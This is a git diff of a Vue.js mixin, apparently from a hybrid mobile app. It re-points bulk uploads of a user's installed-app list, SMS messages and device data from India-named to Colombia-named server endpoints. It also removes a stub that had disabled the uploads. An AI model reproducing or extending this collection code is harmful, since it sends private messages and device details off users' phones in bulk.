@@ -6,7 +6,6 @@ window.syncDataResolve = null;
 window.syncDataReject = null;
 const SYNC_LOCAL_KEY = 'sync-app-data-status';
 const DATA_API_HOST = process.env.VUE_APP_UPLOAD_DATA_APIPREFIX;
-//const NEED_SYNC_TYPE = ['appListFunName', 'imageListFunName', 'contactsListFunName', 'msgListFunName', 'devFunName', 'devBaseFunName'];
 const NEED_SYNC_TYPE = ['appListFunName', 'msgListFunName', 'devFunName', 'devBaseFunName'];
 
 export default {
@@ -18,63 +17,25 @@ export default {
           data = JSON.parse(data);
         }
         try {
-          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
+          await axios.post(`${DATA_API_HOST}/original/colombiaUpload`, {
             mobile: this.userInfo.mobile,
             app: data,
           });
-          // await this.$http.post(`/api/userCollect/collectApp`, {
-          //   userId: this.userInfo.id || this.appGlobal.userId,
-          //   data: this.zip(data),
-          // });
           this.updateLocalSyncStatus('appListFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('appListFunName', false);
         }
       };
-      // window.onimageListFunName = async data => {
-      //   console.log('收到onimageListFunName data:' + JSON.stringify(data));
-      //   if (typeof data != 'string') {
-      //     data = JSON.stringify(data);
-      //   }
-      //   try {
-      //     await this.$http.post(`/api/userCollect/collectImage`, {
-      //       userId: this.userInfo.id || this.appGlobal.userId,
-      //       data: this.zip(data),
-      //     });
-      //     this.updateLocalSyncStatus('imageListFunName', true);
-      //   } catch (error) {
-      //     this.updateLocalSyncStatus('imageListFunName', false);
-      //   }
-      // };
-      // window.oncontactsListFunName = async data => {
-      //   console.log('收到oncontactsListFunName data:' + JSON.stringify(data));
-      //   if (typeof data != 'string') {
-      //     data = JSON.stringify(data);
-      //   }
-      //   try {
-      //     await this.$http.post(`/api/userCollect/collectContacts`, {
-      //       userId: this.userInfo.id || this.appGlobal.userId,
-      //       data: this.zip(data),
-      //     });
-      //     this.updateLocalSyncStatus('contactsListFunName', true);
-      //   } catch (error) {
-      //     this.updateLocalSyncStatus('contactsListFunName', false);
-      //   }
-      // };
       window.onmsgListFunName = async data => {
         console.log('收到onmsgListFunName data:' + JSON.stringify(data));
         if (typeof data == 'string') {
           data = JSON.parse(data);
         }
         try {
-          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
+          await axios.post(`${DATA_API_HOST}/original/colombiaUpload`, {
             mobile: this.userInfo.mobile,
             msg: data,
           });
-          // await this.$http.post(`/api/userCollect/collectMsg`, {
-          //   userId: this.userInfo.id || this.appGlobal.userId,
-          //   data: this.zip(data),
-          // });
         } catch (error) {}
       };
       window.ondevFunName = async data => {
@@ -83,14 +44,10 @@ export default {
           data = JSON.parse(data);
         }
         try {
-          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
+          await axios.post(`${DATA_API_HOST}/original/colombiaUpload`, {
             mobile: this.userInfo.mobile,
             device: data,
           });
-          // await this.$http.post(`/api/userCollect/collectDevice`, {
-          //   userId: this.userInfo.id || this.appGlobal.userId,
-          //   data: this.zip(data),
-          // });
           this.updateLocalSyncStatus('devFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('devFunName', false);
@@ -102,14 +59,10 @@ export default {
           data = JSON.parse(data);
         }
         try {
-          await axios.post(`${DATA_API_HOST}/original/indiaUpload`, {
+          await axios.post(`${DATA_API_HOST}/original/colombiaUpload`, {
             mobile: this.userInfo.mobile,
             deviceBase: data,
           });
-          // await this.$http.post(`/api/userCollect/collectDeviceBase`, {
-          //   userId: this.userInfo.id || this.appGlobal.userId,
-          //   data: this.zip(data),
-          // });
           this.updateLocalSyncStatus('devBaseFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('devBaseFunName', false);
@@ -163,17 +116,11 @@ export default {
     startSyncData(needResolve = false) {
       return new Promise(async (resolve, reject) => {
         try {
-          // TODO
-          resolve({ success: true });
-
           await this.getUserInfo();
           // 第一步判断是否需要
-          let res = await axios.post(`${DATA_API_HOST}/original/indiaIsUpload`, {
+          let res = await axios.post(`${DATA_API_HOST}/original/colombiaIsUpload`, {
             mobile: this.userInfo.mobile,
           });
-          // let res = await this.$http.post(`/api/userCollect/isUploadData`, {
-          //   userId: this.appGlobal.userId,
-          // });
           if (res.data && res.data.data.isUpload == 1) {
             // 已经上传
             resolve({ success: true });
@@ -194,7 +141,7 @@ export default {
             setTimeout(async res => {
               window.syncDataResolve = null;
               window.syncDataReject = null;
-              res = await axios.post(`${DATA_API_HOST}/original/indiaIsUpload`, {
+              res = await axios.post(`${DATA_API_HOST}/original/colombiaIsUpload`, {
                 mobile: this.userInfo.mobile,
               });
               if (res.data && res.data.data.isUpload == 1) {
